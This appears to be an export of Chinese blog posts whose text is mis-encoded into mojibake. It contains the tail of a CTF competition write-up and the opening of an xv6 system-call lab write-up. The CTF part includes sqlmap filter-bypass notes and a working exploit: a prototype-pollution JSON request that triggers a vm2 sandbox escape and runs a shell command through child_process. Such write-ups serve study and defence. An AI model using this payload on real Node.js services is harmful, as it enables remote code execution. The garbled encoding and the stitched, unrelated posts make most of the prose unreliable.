æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked queriesï¼‰ Tï¼šæ—¶é—´å‹ç›²æ³¨ï¼ˆTime-based blindï¼‰ Qï¼šå†…è”æŸ¥è¯¢æ³¨å…¥ï¼ˆinline Queryï¼‰ --tamper: æŒ‡å®šè‡ªå®šä¹‰è¿‡æ»¤è„šæœ¬ã€‚åœ¨æœ¬é¢˜ä¸­ï¼Œç©ºæ ¼è¢«è¿‡æ»¤ä¸”æ³¨é‡Šç»•è¿‡/**/ï¼ŒåŠ å·ç»•è¿‡+éƒ½ä¸å¥½ä½¿ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥æŠŠtamperé‡Œè‡ªå¸¦çš„space2plus.pyä¸­çš„+éƒ½æ”¹æˆ\\nï¼Œå°±å˜æˆäº†space2newline æ¯”èµ›æ—¶è¿œç¨‹ç¯å¢ƒæœ‰äº›ç©ºæ ¼èƒ½ç”¨%0aç»•è¿‡æœ‰äº›ä¸è¡Œï¼ŒğŸ‘´ç»å°½è„‘æ±ç”¨æ‹¬å·ç»•è¿‡ï¼Œæœ€ç»ˆè€»è¾±ä¸‹æ’­ã€‚èµ›åå¤ç°çš„ç¯å¢ƒé‡Œurlencodeéƒ½ä¸å¥½ä½¿äº†ï¼Œæœ€åæƒ³åˆ°ç›´æ¥å…¨éƒ¨ç”¨æ¢è¡Œç¬¦\\nå³å¯ã€‚\nå‚è€ƒé“¾æ¥ï¼š\nsqlmapä¸­æ–‡æ‰‹å†Œ Web3 è€ƒä¸€nodejsï¼Œæ²¡æºç å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ã€‚å…¶å®ç›´æ¥è·Ÿæ–‡ä»¶åå°±èƒ½è¯»æºç ï¼Œä½†æ˜¯ä¸ŠåˆğŸ‘´å¿˜äº†,è¡€äºx5ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 const express = require(\u0026#39;express\u0026#39;); const router = express.Router(); const {VM, VMScript} = require(\u0026#39;vm2\u0026#39;); const vm = new VM(); const backdoor = function () { try { const script = new VMScript(Object.door); return (new VM()).run(script); } catch (e) { console.log(e); } } const isObject = obj =\u0026gt; obj \u0026amp;\u0026amp; obj.constructor \u0026amp;\u0026amp; obj.constructor === Object; const merge = (a, b) =\u0026gt; { for (var attr in b) { if (isObject(a[attr]) \u0026amp;\u0026amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a } const clone = (a) =\u0026gt; { return merge({}, a); } router.get(\u0026#39;/\u0026#39;, function (req, res, next) { res.render(\u0026#39;index\u0026#39;, { content: \u0026#39;wwwwwwwwwrong method!!!\u0026#39; }); }); router.post(\u0026#39;/\u0026#39;, function (req, res, next) { try { console.log(req.body) const body = JSON.parse(JSON.stringify(req.body)); const copybody = clone(body) if (copybody.back) { const a = backdoor() res.render(\u0026#39;index\u0026#39;, { content: \u0026#39;wwwwwwwwwwwwwhat are you doing???\u0026#39; + a}) return a } res.render(\u0026#39;index\u0026#39;, { content: \u0026#39;wwwwwwwwwwwwwhat are you doing???\u0026#39; }) }catch(error){ res.render(\u0026#39;index\u0026#39;, { content: \u0026#34;i don\u0026#39;t think you are right\u0026#34; }) console.log(error) } }) module.exports = router; ğŸ‘´ç›´æ¥æ‰¬backdoorï¼Œç„¶åå°±å®•äº†ï¼Œå‘ä¸€å…¬å‘Šè¯´ä¸è®©åˆ backdoorï¼Œåªèƒ½åŠ å›ºã€‚æˆ‘åªèƒ½è¯´ä½ è¿™ç§Fixç¡®å®æœ‰ç‚¹ç´ è´¨ã€‚\nç„¶åä¿®ä¹Ÿç®€å•ï¼ŒåŠ ä¸ªwafé˜²ä¸€ä¸‹nodeé¢˜å¸¸è§çš„payloadå…³é”®å­—å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 const backdoor = function () { try { const script = new VMScript(Object.door); if(Object.door.search(/construtcor|exec/)\u0026gt;=0) return; return (new VM()).run(script); } catch (e) { console.log(e); } } è¿™é“é¢˜ä¸æ˜¯å¾ˆäºï¼Œå°±æ˜¯æœ‰ç‚¹äºã€‚ä¹Ÿä¸æ˜¯ç‰¹åˆ«äºï¼Œæ€»ä¹‹è¿˜æ˜¯æŒºäºçš„ã€‚ä¸‹åˆfixçš„æ—¶å€™ç¦»çº¿èµ„æ–™é‡ŒæŸ¥åˆ°äº†ç›¸å…³é¢˜å‹ï¼Œä¹Ÿä¸æ˜¯å¾ˆå¤æ‚ï¼ŒğŸ‘´å±äºæ˜¯æ®‹ç–¾äººå¤å¥ã€‚\nèµ›åWPï¼šé¦–å…ˆç”¨åŸå‹é“¾æ±¡æŸ“æ‹¿åˆ°Object.doorï¼Œç„¶åå¥—vm2çš„æ²™ç®±é€ƒé€¸payloadå³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 POST /back HTTP/1.1 Host: localhost:3000 Content-Type: application/json Content-Length: 229 { \u0026#34;back\u0026#34;: \u0026#34;nmsl\u0026#34;, \u0026#34;__proto__\u0026#34;: { \u0026#34;door\u0026#34;: \u0026#34;\\nlet res = import(\u0026#39;./foo.js\u0026#39;);\\nres.toString.constructor(\\\u0026#34;return this\\\u0026#34;)().process.mainModule.require(\\\u0026#34;child_process\\\u0026#34;).execSync(\\\u0026#34;whoami\\\u0026#34;).toString();\\n\u0026#34; } } å‚è€ƒé“¾æ¥ï¼šCVE-2021-23449ã€‚æ¼æ´é€‚ç”¨ç‰ˆæœ¬ï¼švm2@3.9.3\nWeb4 ç»™ä¸€jaråŒ…ï¼Œè™½ç„¶ğŸ‘´å¤œé‡Œçš„æ™ºæ…§è£…äº†javaé€†å‘çš„ç¯å¢ƒã€‚ä½†æ˜¯çœ‹äº†çœ‹ä»£ç æ²¡å•¥ä¸šåŠ¡é€»è¾‘ï¼Œåº”è¯¥æ˜¯æ¡†æ¶çš„æ´ï¼ŒğŸ‘´ä¸ä¼šï¼Œé•¿å¤§åå†æ¥å­¦å§ã€‚\nèµ›åçœ‹ï¼ŒğŸ‘´çŒœæœ‰å¯èƒ½æ˜¯è¿™ä¸ªæ´ï¼šjeecg-boot/ç§¯æœ¨æŠ¥è¡¨çš„Freemarkerçš„SSTIä»»æ„ä»£ç æ‰§è¡Œ\nå†³èµ›æˆ˜æŠ¥ ä¸Šåˆåˆšç»“æŸä¸€åˆ†é’Ÿï¼ŒğŸ‘´é˜Ÿå‹å‡ºä¸€ä¸ªé€†å‘ï¼Œå±äºæ˜¯å…¸ä¸­å…¸ï¼Œè¡€äºx6ã€‚ä¸Šåˆæ’å20å¤šï¼Œä¸‹åˆfixäºäº†300åˆ†å·¦å³ã€‚æœ€åğŸ‘´é˜Ÿç¬¬17åã€‚æœ¬ç§‘ç”Ÿé˜Ÿæ›´æ˜¯å¯„ä¸­å¯„ï¼Œå»ºè®®ç«‹åˆ»æ‹›å¼€æ‰¹æ–—å¤§ä¼šï¼Œç‹ ç‹ çš„å” ä¸€è¾ˆå­ã€‚\nä¸‹åˆç»“æŸåä¸»åŠæ–¹é—®å‰20çš„è¦å½•å±ï¼ŒğŸ‘´å¯»æ€åº”è¯¥èƒ½æ‹¿ä¸€å¥–çŠ¶å§ã€‚äºæ˜¯æå‰å¼€é¦™æ§Ÿï¼Œå¥½æ­¹æ²¡ç©ºæ‰‹å›å»ã€‚äºæ˜¯é«˜é«˜å…´å…´åˆ°äº†é¢å¥–å…¸ç¤¼ï¼Œè¿˜çœ‹ä¸€è¡¨æ¼”å‘¢ã€‚\nğŸ‘´ææŒ‡ä¸€ç®—ï¼Œ1 + 3 + 5 + 7 = 16 \u0026lt; 17ã€‚å˜¶â€”â€”è¿™è¯¥æ­»çš„å®¿å‘½æ„Ÿã€‚\nè´µğŸ‹çš„è¯…å’’ï¼š\næ¯”èµ›ç»“æŸä¹‹åä¸€åˆ†é’Ÿå‡ºflag åŠåœºå¼€é¦™æ§Ÿç„¶åå·®ä¸€åæ‹¿å¥– æœ‰ææ— å ‚ é‡Šä¹‰ï¼šæœ‰å¥–é‡‘æµ·åº•æï¼Œæ²¡å¥–é‡‘æ»šå›å»åƒé£Ÿå ‚ã€‚\nå…¶å®å°±ç®—ğŸ‘´ä»¬æŠŠäºäº†çš„é¢˜éƒ½è¡¥ä¸Šä¹Ÿå¤Ÿå‘›èƒ½è¿›å‰9ã€‚æ‰€ä»¥ä¹Ÿä¸æ˜¯å¾ˆäºï¼Œå°±æ˜¯æœ‰ç‚¹æ™¦æ°”ã€‚\næ€»ä¹‹ï¼Œæ¯”å®Œèµ›äº†è¿˜æ˜¯è¦è€ƒè™‘åŠæ­£äº‹â€”â€”æ—…æ¸¸ã€‚è¿™æ¬¡æ¥æ­¦æ±‰å¯æ˜¯é™¤æ™¦ä¹‹è¡Œï¼Œç»å¯¹ä¸èƒ½è®©æ¯”èµ›çš„æ™¦æ°”ç•™ç»™ç¬¬äºŒå¤©ã€‚\né™¤æ™¦æœªåŠè€Œä¸­é“å´©æ®‚ ğŸ‘´ï¼šæï¼ é˜Ÿå‹Aï¼šé¼»å­å µç€äº†å¾ˆå‰å°”éš¾å— é˜Ÿå‹Bï¼šğŸ‘´è¦å»è§æœ‹å‹ åäº†ï¼Œæ™¦èµ·æ¥äº†ã€‚éƒ½æ€ªå»é¢å¥–å…¸ç¤¼çš„æ—¶å€™æ²¡ç©¿å¤–å¥—ç»™å†»ç€äº†ã€‚ğŸ‘´å»é—®éš”å£é˜Ÿï¼š\nå†°ç³–é›ªç‹¸ï¼šğŸ‘´é˜Ÿå‹ä¹Ÿçƒ§èµ·æ¥äº† ğŸ‘´ï¼šï¼Ÿæ´»ç€ ä»€ä¹ˆå˜›ï¼Œè¿™ä¸æ˜¯ä»€ä¹ˆä¹Ÿæ²¡é™¤æ‰å—(ğŸ˜â†’ğŸ•¶ï¸ğŸ¤ğŸ˜­)\nå®‰é¡¿å¥½ç—…äººï¼Œæœ€ç»ˆåªæœ‰ğŸ‘´å’Œå†°ç³–é›ªç‹¸ä¿©äººå»å¸‚é‡Œçº¦ä¼šã€‚åˆ°äº†åœ°æ–¹ä¸€çœ‹ï¼Œä½ æ‰¾çš„è¿™æ˜¯ä»€ä¹ˆåœ°æ–¹ï¼Ÿï¼Ÿ\nä½†æ˜¯æ­¦æ±‰ç¡®å®å¤§åŸå¸‚ã€‚ğŸ‘´ä»¬ç»ˆäºåƒäº†é¡¿å¥½çš„ï¼Œä¿©äººä¹°4æ¯èŒ¶é¢œæ‚¦è‰²è¿˜éƒ½tmå–å®Œäº†ã€‚\nğŸ‘´ï¼šè¿™ç³–æ°´æ€ä¹ˆæ²¡å‘³å•Šï¼Ÿ å†°ç³–é›ªç‹¸ï¼šä½ å°±æ˜¯å±±çŒªåƒä¸äº†ç»†ç³  ğŸ‘´ï¼šç¡®å® åƒé¥±å–è¶³ï¼Œå»æ±Ÿè¾¹çœ‹çœ‹é»„é¹¤æ¥¼å§ã€‚äºæ˜¯ğŸ‘´ä»¬æ‰“è½¦å»äº†æ±Ÿæ»©ã€‚å¤ªç¾ä¸½äº†é•¿æ±Ÿï¼Œè¿˜æ˜¯çœ‹çœ‹è¿œå¤„çš„é»„é¹¤æ¥¼å§ã€‚æˆ‘æ¥¼å‘¢ï¼Ÿ\nå¥½å®¹æ˜“æ¥ä¸€è¶Ÿçœ‹ä¸ç€äºäº†ã€‚äºæ˜¯ğŸ‘´ä»¬æ‰“è½¦å»äº†é»„é¹¤æ¥¼ã€‚ä½ å—è¿‡ä¸ªæ±Ÿ20å—é’±ï¼Œè¡€äºã€‚\næœ€ååˆ°äº†é»„é¹¤æ¥¼åº•ä¸‹æ­£å¥½å…³é—¨ï¼Œå¯„ã€‚\nğŸ‘´çªç„¶æ„è¯†åˆ°ï¼Œè¿™æ˜¯ä¸æ˜¯è±¡å¾ç€ğŸ‘´é˜Ÿæ¯”èµ›å·®ä¸€åæ²¡æ‹¿åˆ°å¥–ã€‚è¿èµ·æ¥äº†ã€‚\né™¤æ™¦è¾©è¯æ³• å›æ¥çš„ğŸ›«ä¸Šï¼ŒğŸ‘´å¼€å§‹ç»†æ•°è¿™ä¸€è¶Ÿæ­¦æ±‰ä¹‹è¡Œçš„æ™¦æ°”ã€‚\næˆ‘ç¿»å¼€å‚èµ›æ‰‹å†Œä¸€æŸ¥ï¼Œè¿™æ¯”èµ›é£Ÿå®¿è‡ªç†ï¼Œæ•´æ•´é½é½çš„æ¯é¡µä¸Šéƒ½å†™ç€â€œæ¥šæ…§æ¯â€å‡ ä¸ªå­—ã€‚æˆ‘æ¨ªç«–ç¡ä¸ç€ï¼Œä»”ç»†çœ‹äº†åŠå¤œï¼Œæ‰ä»å­—ç¼é‡Œçœ‹å‡ºå­—æ¥ï¼Œæ»¡æœ¬éƒ½å†™ç€ä¸€ä¸ªå­—æ˜¯â€œæ™¦â€ï¼\nè¿™æ¯”èµ›åå­—å°±æ²¾ç‚¹æ™¦ ä»¥ä¸ºå»æ¡é’±å®é™…ä¸Šé¸¡æ¯›æ²¡èµšç€ï¼Œæ­¤ä¸ºç¬¬äºŒæ™¦ å·®ä¸€åæ‹¿å¥–çŠ¶ï¼Œæ­¤ä¸ºç¬¬ä¸‰æ™¦ æ¯”å®Œèµ›é˜Ÿå‹èººäº†ä¿©ï¼Œæ­¤ä¸ºç¬¬å››æ™¦ æ™šä¸Šåƒé¥­çš„åœ°æ–¹ä¹Ÿæ²¾ç‚¹æ™¦ å»é»„é¹¤æ¥¼åˆšå¥½å…³é—¨ï¼Œæ­¤ä¸ºç¬¬å…­æ™¦ è´µğŸ‹è‘—åå“²å­¦å®¶Aidaipåœ¨å…¶è‘—ä½œã€Šäºæ™¦äºŒè±¡æ€§ã€‹$^{[1]}$ä¸­é˜é‡Šäº†æ™¦æ°”çš„åŸºæœ¬åŸç†ï¼š\näºäº†ï¼Œå´æƒ³ç€èµšäº†ï¼Œç»ˆäºæ™¦æ°”ã€‚â€”â€”Aidaip\nè¿™ä¸€åŸç†åç»å­¦è€…æ•´ç†æˆå¦‚ä¸‹çš„å½¢å¼åŒ–æè¿°ï¼š\n$$ äº \\xrightarrow{\\textit{æƒ³èµš}} æ™¦ $$\næœ¬ç§‘ğŸ‘´çœŸçš„ä¸ºäº†æ‰“æ¯”èµ›å»çš„ï¼Œæ‰€ä»¥ä»–ä»¬äºäº†ï¼Œè®©äººå” ä¸€è¾ˆå­ã€‚ä¸ºä»€ä¹ˆäºäº†ï¼Œè¿˜æ˜¯å› ä¸ºèœã€‚èœå°±å¤šç»ƒã€‚\nğŸ‘´ä¸ºäº†é™¤æ™¦è€Œå½³äºï¼Œæ­¤æ—¶è¿˜æ²¡æœ‰äºã€‚ä¹Ÿæ²¡æœ‰æƒ³èµšï¼Œä½†è¿˜æ˜¯æ™¦æ°”ã€‚ è¯´æ˜ç›®å‰çš„ä¸»æµç†è®ºä¸è¶³ä»¥è§£é‡Šæ–°çš„å®éªŒç°è±¡ã€‚\nå¦‚æœğŸ‘´èƒ½æŠŠé¢˜éƒ½ç§’äº†ï¼ŒğŸ‘´ä»¬å°±ä¸ä¼šæ³¨æ„åˆ°å…¶ä»–çš„æ™¦æ°”ã€‚ä¸ºä»€ä¹ˆğŸ‘´ä¸èƒ½ç§’äº†ï¼Œå› ä¸ºğŸ‘´å¤ªèœäº†ã€‚ä¸ºä»€ä¹ˆğŸ‘´å¤ªèœäº†ï¼Œå› ä¸ºæ™¦æ°”ã€‚ ä½†ä¹Ÿæ­£å› ä¸ºæ™¦æ°”ï¼ŒğŸ‘´æ‰ä¼šæƒ³é™¤æ™¦ã€‚\næ‰€ä»¥å¾—å‡ºç»“è®ºï¼Œè¶Šæ™¦æ°”ï¼Œè¶Šæ™¦æ°”ã€‚\nğŸ‘´ä¸€æŠ¬å¤´ï¼Œå¤§å¸ˆæˆ‘æ‚Ÿäº†ï¼ŒåŸæ¥huiä¸€ç›´åœ¨æˆ‘ä»¬èº«è¾¹ã€‚ä»–çœŸhuiäº†å—ï¼Œå¦‚huiã€‚\nç»™å¸¦ğŸ”¥é€ä¸Šæ–°å¹´ç¥ç¦ï¼š\n2024å¸Œæœ›å¸¦ğŸ”¥éƒ½èƒ½è¿œç¦»æ™¦æ°” å‚è€ƒæ–‡çŒ® [1] AiDaip. äºæ™¦äºŒè±¡æ€§[EB/OL]. 2022. https://aidaip.github.io/life/2022/06/01/%E4%BA%8F%E6%99%A6%E4%BA%8C%E8%B1%A1%E6%80%A7.html\n","date":"2023-12-23T20:29:12+08:00","image":"https://lonelyuan.github.io/p/chb2023/chuhui_hu16a07914fba082891c6db9355734618b_368581_120x120_fill_box_smart1_3.png","permalink":"https://lonelyuan.github.io/p/chb2023/","title":"é™¤æ™¦æ¯2023æ¸¸å¯„"},{"content":"The Deeper, The Harder ç¬¬ä¸€ä¸ªå®éªŒå±äºçƒ­èº«ï¼Œåªéœ€è¦æˆ‘ä»¬å»è°ƒç”¨ç³»ç»Ÿæä¾›çš„æ¥å£ï¼Œç§°ä¹‹ä¸ºç³»ç»Ÿè°ƒç”¨(System Calls)ã€‚è€Œè¿™ä¸ªå®éªŒå°±è¦æ­å¼€æ“ä½œç³»ç»Ÿçš„é»‘ç›’ï¼Œçœ‹çœ‹ç³»ç»Ÿè°ƒç”¨çš„åŸç†å¹¶å†™å‡ ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ã€‚\né…ç¯å¢ƒï¼šåŸºäºqemuçš„gdbè°ƒè¯• ç¬¬ä¸€é¢˜å‡ºäº†å‡ ä¸ªå¡«ç©ºé¢˜ï¼Œç›®çš„æ˜¯ä¸ºäº†å­¦ä¼šç”¨gdbè°ƒè¯•kernelã€‚å› ä¸ºæ˜¯åŸºäºqemuæ¥çš„gdbï¼Œéœ€è¦åœ¨ä¸¤ä¸ªç»ˆå€Ÿç”¨ç½‘ç»œç«¯å£è¿›è¡Œè¿œç¨‹è°ƒè¯•ã€‚å…·ä½“æ“ä½œä¸ºï¼š\næ‰§è¡Œmake qemu-gdbã€‚æœ€åä¼šè¾“å‡ºä¸€ä¸ªç«¯å£å·ï¼Œlikeï¼š 1 2 3 # make qemu-gdb *** Now run \u0026#39;gdb\u0026#39; in another window. qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -global virtio-mmio.force-legacy=false -drive file=fs.img,if=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 -S -gdb tcp::25000 å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œæ‰§è¡Œgdb-multiarchã€‚ç„¶åæ‰§è¡Œï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 (gdb) target remote localhost:25000 Remote debugging using localhost:25000 warning: Architecture rejected target-supplied description warning: No executable has been specified and target does not support determining executable automatically. Try using the \u0026#34;file\u0026#34; command. Truncated register 37 in remote \u0026#39;g\u0026#39; packet (gdb) set architecture riscv:rv64 # å®éªŒæ‰‹å†Œæ²¡æåˆ°æ¶æ„ï¼Œä¸æŒ‡å®šæ¶æ„ä¼šå´©å± The target architecture is assumed to be riscv (gdb) file kernel/kernel Reading symbols from kernel/kernel... (gdb) b syscall Breakpoint 1 at 0x8000203c: file kernel/syscall.c, line 133. (gdb) c Continuing. [Switching to Thread 1.3] Thread 3 hit Breakpoint 1, syscall () at kernel/syscall.c:133 133 { å®é™…ä¸Šï¼Œgdbä¹Ÿä¼šæç¤ºæˆ‘ä»¬ï¼Œé¡¹ç›®æ ¹ç›®å½•é‡Œæœ‰ä¸€ä¸ª.gdbinité…ç½®æ–‡ä»¶ï¼Œåªéœ€è¦åœ¨å®¶ç›®å½•çš„.gdbinitä¸­å¼•å…¥ï¼š\n1 add-auto-load-safe-path /xv6-labs-2023/.gdbinit å³å¯ä¸ç”¨æ¯æ¬¡éƒ½è¾“å…¥ä¸Šè¿°æ“ä½œã€‚\nå¹¶ä¸”ä½œä¸ºCTFerï¼Œå½“ç„¶ä¸èƒ½æ»¡è¶³äºåŸç”Ÿgdbäº†ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥â€”â€”\npedaï¼Œå¯åŠ¨ï¼ï¼ è¿™ä¸€å¯åŠ¨ä¸è¦ç´§ï¼Œé‡åˆ°ä¸€å †å…³äºriscvçš„bugã€‚\né¦–å…ˆæ˜¯å¯åŠ¨ gdb-multiarch æ—¶éœ€è¦ç¡®ä¿export LC_CTYPE=C.UTF-8ï¼Œå› ä¸ºdockeråŸºç¡€é•œåƒæ˜¯æç®€ç‰ˆç³»ç»Ÿï¼Œå¯¹å­—ç¬¦é›†æ”¯æŒä¸å‹å¥½ã€‚\nç„¶åpedaèƒ½æ­£å¸¸è°ƒè¯•ï¼Œä½†æ˜¯ä¸èƒ½å±•ç¤ºé‚£å››ä¸ªé¢æ¿ï¼Œè¿™å°±æ„ä¹‰ä¸å¤§äº†ã€‚æ‰€ä»¥æˆ‘ç›´æ¥â€”â€”\npwndbgï¼Œå¯åŠ¨ï¼ï¼ ç„¶åå°±ç›´æ¥ï¼š\n1 2 0x0000000000001000 in ?? () Exception occurred: context: (\u0026lt;class \u0026#39;NotImplementedError\u0026#39;\u0026gt;) åŸæ¥æ˜¯ä»£ç æ²¡å†™å®Œï¼Œé‚£çœŸçš„æ²¡äº‹äº†ã€‚æ‰€ä»¥æˆ‘ç›´æ¥â€”â€”\ngefï¼Œå¯åŠ¨ï¼ï¼ ä¸‡å¹¸è¿™æ¬¡èƒ½æ˜¾ç¤ºé¢æ¿äº†ã€‚çœ‹äº†çœ¼githubï¼Œè¿˜å¾—æ˜¯gefæ›´æ–°çš„å‹¤å¿«ã€‚\npeda, pwndbg, geféƒ½æ˜¯CTFä¸­pwnæ–¹å‘å¸¸ç”¨çš„gdbçš„å¢å¼ºæ’ä»¶ï¼Œä½†ä»–ä»¬ä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚\nLab2 SysCall ç»ˆäºæå¥½ç¯å¢ƒï¼Œè™½ç„¶çœ‹èµ·æ¥æ˜¯æ— ç”¨çš„æŠ˜è…¾ï¼Œä½†æ˜¯ä¸ºåé¢æ›´å¤æ‚çš„è°ƒè¯•æ‰“ä¸‹äº†åšå®çš„åŸºç¡€ï¼ˆä½ æœ€å¥½æ˜¯ï¼‰ã€‚\nå¡«ç©ºé¢˜ å¡«ç©ºé¢˜æ²¡æ³•æ‰“åˆ†ï¼Œç›®çš„æ˜¯å¸®åŠ©æˆ‘ä»¬åç»­è¿›è¡Œå†…æ ¸æŠ¥é”™çš„è°ƒè¯•\nQ: æŸ¥çœ‹backtraceè¾“å‡ºï¼Œå“ªä¸ªå‡½æ•°è°ƒç”¨Â syscallÂ äº†ï¼Ÿ\nA: ç”±é¢˜å¯çŸ¥æ˜¾ç„¶æ˜“è¯ã€‚ Q: p-\u0026gt;trapframe-\u0026gt;a7 çš„å€¼æ˜¯å¤šå°‘ï¼Œè¿™ä¸ªå€¼ä»£è¡¨ä»€ä¹ˆï¼Ÿï¼ˆæç¤ºï¼šæŸ¥çœ‹ user/initcode.Sï¼Œè¿™æ˜¯ xv6 å¯åŠ¨çš„ç¬¬ä¸€ä¸ªç”¨æˆ·ç¨‹åºã€‚ï¼‰\nA: gefç›´æ¥æ‰“å°å‡ºæ¥äº†ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨p *p.trapframeæŸ¥çœ‹ã€‚ç»“åˆæºä»£ç å¯çŸ¥ï¼Œa7æ˜¯ç³»ç»Ÿè°ƒç”¨çš„ç´¢å¼•ã€‚å½“å‰è¦æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨æ˜¯sys_exec Q: CPU ä¹‹å‰å¤„äºä»€ä¹ˆæ¨¡å¼ï¼Ÿ\nA: è¯¾æœ¬è®©æˆ‘ä»¬æŸ¥çœ‹sstatuså¯„å­˜å™¨ï¼Œp/t $sstatusï¼Œå¾—åˆ°çš„ç»“æœæ˜¯0x22ã€‚å…¶å«ä¹‰éœ€è¦ç¿»é˜…riscvæ‰‹å†Œï¼Œç›¸å…³å†…å®¹æ–‡æ¡£ç»™å‡ºäº†é“¾æ¥ã€‚ï¼ˆThe RISC-V Instruction Set Manual Volume II: Privileged Architectureï¼‰ åœ¨ç¬¬90é¡µï¼Œå¯çŸ¥ç¬¬å…«ä½çš„SPPä¸º0åˆ™è¡¨ç¤ºtrapæ¥è‡ªäºç”¨æˆ·æ¨¡å¼ã€‚ Q: çå‡ æŠŠæ”¹ä¸‹æŒ‡é’ˆè®©å†…æ ¸å´©æºƒï¼ˆæ¯”å¦‚num = * (int *) 0ï¼‰ã€‚è®°å½•å†…æ ¸å‘ç”Ÿ panic çš„æ±‡ç¼–æŒ‡ä»¤ã€‚å“ªä¸ªå¯„å­˜å™¨å¯¹åº”äºå˜é‡ numï¼Ÿ\nA: specå¯„å­˜å™¨è¡¨ç¤ºå´©æºƒæŒ‡ä»¤çš„åœ°å€ã€‚gefç›´æ¥æŸ¥çœ‹ã€‚ä¹Ÿå¯ä»¥æŸ¥çœ‹kernel/kernel.asm Q: ä¸ºä»€ä¹ˆå†…æ ¸ä¼šå´©æºƒï¼Ÿ\nA: scauseå¯„å­˜å™¨è¡¨ç¤ºå´©æºƒæ ¹å› ã€‚å…·ä½“å†…å®¹åœ¨æ‰‹å†Œ71é¡µçš„è¡¨4.2ã€‚æˆ‘ä»¬çš„å´©æºƒçš„scauseä¸º0xdï¼ŒæŸ¥è¡¨å¾—â€œ13 Load page faultâ€ï¼Œè¡¨æ˜0ä¸èƒ½è¢«æ˜ å°„åˆ°å†…æ ¸åœ°å€ç©ºé—´ã€‚ Q: å†…æ ¸å´©æºƒæ—¶è¿è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿå®ƒçš„è¿›ç¨‹ pid æ˜¯ä»€ä¹ˆï¼Ÿ\nA: p *p riscvçš„ä¸­æ–‡å‚è€ƒèµ„æ–™ï¼šhttps://blog.csdn.net/zzy980511/article/details/130642258\nLab2-1: tracing trace(1 \u0026lt;\u0026lt; SYS_call)ç³»ç»Ÿè°ƒç”¨è¾“å…¥ä¸€ä¸ªæ©ç ï¼Œè¡¨ç¤ºç³»ç»Ÿè°ƒç”¨å·ã€‚å½“æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨æ—¶æ‰“å°ç‚¹ä¸œè¥¿ï¼ŒåŒ…æ‹¬pidï¼Œç¬¬ç³»ç»Ÿè°ƒç”¨åå’Œè¿”å›å€¼ï¼š\u0026lt;pid\u0026gt;:syscall \u0026lt;syscall\u0026gt; -\u0026gt; \u0026lt;ret\u0026gt;\né¦–å…ˆæ¢³ç†ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨çš„è°ƒç”¨é“¾ï¼š\nç”¨æˆ·ä¾§ UPROGS += $U/_trace: ç”¨æˆ·æ€çš„user/trace.cæ˜¯ç³»ç»Ÿè°ƒç”¨int trace(int)çš„æµ‹è¯•ç¨‹åºï¼Œå®éªŒå·²ç»ç»™å‡ºã€‚ user/user.h éœ€è¦å¢åŠ int trace(int)çš„å£°æ˜ user/usys.pl ç”¨äºç”Ÿæˆusys.Sï¼Œé‡Œé¢æ˜¯ç³»ç»Ÿè°ƒç”¨çš„stubã€‚stubæ˜¯ä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„æ¡¥æ¢ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 # Generate usys.S, the stubs for syscalls. print \u0026#34;#include \\\u0026#34;kernel/syscall.h\\\u0026#34;\\n\u0026#34;; sub entry { my $name = shift; print \u0026#34;.global $name\\n\u0026#34;; print \u0026#34;${name}:\\n\u0026#34;; print \u0026#34; li a7, SYS_${name}\\n\u0026#34;; print \u0026#34; ecall\\n\u0026#34;; # è¿›å…¥å†…æ ¸æ€ print \u0026#34; ret\\n\u0026#34;; } entry(\u0026#34;trace\u0026#34;); # ... å†…æ ¸ä¾§ kernel/syscall.h å®šä¹‰ç³»ç»Ÿè°ƒç”¨çš„ç´¢å¼• kernel/syscall.c æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨çš„é€šç”¨æ¥å£ï¼Œæ ¹æ®ä¼ å…¥çš„ç´¢å¼•è¿›è¡Œè½¬å‘ã€‚ kernel/sysproc.c ç³»ç»Ÿè°ƒç”¨çš„å…·ä½“å®ç° 1 2 3 4 5 6 7 8 uint64 sys_trace(void) { int mask; argint(0, \u0026amp;mask); myproc()-\u0026gt;tracemask |= mask; return 0; } ä¿®æ”¹å†…æ ¸ä»£ç  è‡³æ­¤èµ°å®Œäº†ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„å®Œæ•´è°ƒç”¨é“¾ã€‚ä½†å¯¹traceæ¥è¯´ï¼Œè¿˜éœ€è¦ä¿®æ”¹å†…æ ¸ä»£ç å®ç°æˆ‘ä»¬éœ€è¦çš„åŠŸèƒ½ï¼š\nkernel/proc.h: struct procç”¨äºå®šä¹‰ä¸€ä¸ªè¿›ç¨‹ã€‚pidæ˜¯æœ¬æ¥å°±æœ‰çš„å­—æ®µï¼Œæˆ‘ä»¬éœ€è¦å¢åŠ traceæ©ç å­—æ®µã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 struct proc { struct spinlock lock; // p-\u0026gt;lock must be held when using these: enum procstate state; // Process state void *chan; // If non-zero, sleeping on chan int killed; // If non-zero, have been killed int xstate; // Exit status to be returned to parent\u0026#39;s wait int pid; // Process ID // wait_lock must be held when using this: struct proc *parent; // Parent process // these are private to the process, so 